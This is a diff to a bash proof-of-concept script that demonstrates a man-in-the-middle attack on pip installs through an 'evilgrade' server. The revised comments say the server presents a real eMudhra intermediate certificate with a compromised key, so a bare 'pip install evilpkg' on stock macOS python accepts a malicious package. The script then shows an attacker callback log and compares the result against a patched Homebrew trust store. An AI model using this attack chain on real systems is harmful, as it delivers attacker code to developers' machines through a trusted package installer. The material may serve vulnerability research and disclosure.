@@ -17,8 +17,12 @@
 #                           --index-url https://pypi.org:9443/simple. No sudo for
 #                           the webserver, but /etc/hosts still needs sudo.
 #
-# In both modes pip is run with --cert /etc/ssl/cert.pem to model a pip that
-# trusts the SYSTEM store (pip's default certifi bundle is NOT vulnerable).
+# The server cert is a REAL eMudhra intermediate (cross-signed by the public
+# AAA/Sectigo root) with a compromised key -- NOT a self-forged CA. So a BARE
+# `pip install` (no --cert, no injected CA) is accepted by any client whose
+# trust store still ships the AAA root, which includes the stock macOS
+# /usr/bin/python3 used here. The CONTROL at the end contrasts a vulnerable
+# store (system) against a patched one (Homebrew python / ca-certificates).
 ###############################################################################
 set -u
 cd "$(dirname "$0")/../.." || exit 1
@@ -61,12 +65,12 @@ else
 fi
 
 echo
-echo "== VICTIM: pip install over evilgrade (system trust store via --cert) =="
+echo "== VICTIM: BARE pip install over evilgrade (stock macOS python, no flags) =="
 echo "   index: $IDX_SHOWN"
-echo "   \$ /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem $INDEX_ARG evilpkg"
+echo "   \$ /usr/bin/python3 -m pip install $INDEX_ARG evilpkg"
 echo "   ---- pip output ----"
 timeout 90 /usr/bin/python3 -m pip install \
-    --cert /etc/ssl/cert.pem --no-build-isolation --no-cache-dir --disable-pip-version-check \
+    --no-build-isolation --no-cache-dir --disable-pip-version-check \
     $INDEX_ARG evilpkg 2>&1 | tail -6 | sed 's/^/   /'
 /usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
 sleep 1
@@ -78,13 +82,22 @@ echo "== PROOF: attacker callback on 127.0.0.1:$LPORT =="
 [ -s /tmp/pip_cb.log ] && sed 's/^/   /' /tmp/pip_cb.log || echo "   <none>"
 
 echo
-echo "== CONTROL: same install with pip's DEFAULT cert bundle (certifi) =="
-printf "   default certifi: "
-if timeout 30 /usr/bin/python3 -m pip install --no-build-isolation --no-cache-dir \
-     --disable-pip-version-check $INDEX_ARG evilpkg >/dev/null 2>&1; then
-    echo "accepted (unexpected)"; /usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
+echo "== CONTROL: a patched trust store must REJECT (proves it is the client bundle, not a flag) =="
+BREW_PY=/opt/homebrew/bin/python3
+if [ -x "$BREW_PY" ]; then
+    printf "   Homebrew python (AAA root removed / eMudhra distrusted): "
+    if timeout 30 "$BREW_PY" -m pip install --no-build-isolation --no-cache-dir \
+         --disable-pip-version-check $INDEX_ARG evilpkg >/dev/null 2>&1; then
+        echo "accepted (unexpected)"; "$BREW_PY" -m pip uninstall -y evilpkg >/dev/null 2>&1
+    else
+        echo "REJECTED (TLS: eMudhra chain not trusted by this bundle) -- as expected"
+    fi
 else
-    echo "REJECTED (TLS: eMudhra CA not in certifi) -- pip default is NOT vulnerable"
+    echo "   (no Homebrew python to contrast; stock /usr/bin/python3 is the vulnerable case above)"
 fi
+echo
+echo "   NOTE: the victim step above used BARE pip -- no --cert, no injected CA. The cert is a"
+echo "   real eMudhra intermediate (compromised key) cross-signed by the public AAA/Sectigo root,"
+echo "   so it is trusted by default wherever that root is still present (stock macOS python here)."
 
 echo; echo "== done =="
